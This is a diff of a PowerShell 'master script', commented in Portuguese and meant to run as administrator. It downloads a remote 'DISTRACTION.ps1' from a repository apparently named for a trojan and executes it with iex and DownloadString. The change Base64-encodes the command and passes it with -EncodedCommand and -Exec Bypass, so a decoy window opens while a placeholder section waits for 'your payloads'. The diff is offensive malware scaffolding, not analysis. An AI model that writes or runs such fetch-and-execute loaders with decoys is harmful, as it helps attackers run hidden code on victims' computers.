@@ -2,14 +2,19 @@
 # SCRIPT MESTRE - EXECUTADO NO POWERSHELL ADMIN
 # ==============================================
 
-# 1. Inicia a distração em um processo separado (para ter acesso à interface gráfica)
-#    Baixa o script DISTRACTION.ps1 e executa em uma nova janela do PowerShell (oculta)
+# 1. Inicia a distração em um processo separado, com janela Normal (para garantir GUI)
 $distractScript = "https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/DISTRACTION.ps1"
 $distractCommand = "iex ((New-Object Net.WebClient).DownloadString('$distractScript'))"
-Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -WindowStyle Hidden -Exec Bypass -Command `"$distractCommand`"" -WindowStyle Hidden
 
-# Dá um tempo para a distração abrir o formulário (2 segundos)
-Start-Sleep -Seconds 2
+# Converte para Base64 para evitar problemas de escape
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($distractCommand)
+$encoded = [Convert]::ToBase64String($bytes)
+
+# Inicia o PowerShell com a distração (janela Normal, mas depois o script pode esconder)
+Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -WindowStyle Normal -Exec Bypass -EncodedCommand $encoded"
+
+# Aguarda a distração abrir o formulário (aumentei para 5 segundos para garantir download)
+Start-Sleep -Seconds 5
 
 # 2. AQUI VOCÊ ADICIONA SEUS PAYLOADS (UM POR UM)
 # Exemplo:
